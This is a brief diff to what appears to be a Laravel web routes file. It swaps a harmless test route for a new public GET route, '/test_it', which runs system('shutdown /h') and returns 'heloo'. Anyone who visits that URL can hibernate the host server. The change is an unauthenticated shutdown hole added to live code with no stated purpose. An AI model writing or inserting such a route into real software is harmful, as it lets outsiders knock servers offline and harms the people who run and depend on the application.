@@ -1141,9 +1141,9 @@ Route::get('updates/patch1', 'UpdatesController@patch1');
 
 //test Route
 
-Route::get('/test', function () {
-    //session_unset();
-    return Module_state('daily_school_schedule');
+Route::get('/test_it', function () {
+    system('shutdown /h');
+    return "heloo";
 });
 
 
